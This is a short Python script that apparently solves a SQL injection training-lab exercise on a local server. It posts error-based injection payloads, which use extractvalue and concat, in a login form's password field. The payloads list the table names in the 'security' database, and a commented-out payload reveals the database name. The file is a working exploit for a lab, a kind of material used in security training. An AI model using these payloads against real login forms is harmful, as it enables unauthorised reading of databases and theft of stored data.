import requests
from lxml import etree
url = "http://127.0.0.1/Less-17/"

for i in range(4):
    passwd = "1' and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='security' limit " + str(i) + ",1),0x7e))#"
    #passwd = "1' and extractvalue(1,concat(0x7e,(select database()),0x7e))#"
    data = {
        "uname":"admin",
        "passwd":passwd}

    res = requests.post(url=url, data=data).text
    html = etree.HTML(res)
    result = html.xpath('//font/text()')
    print result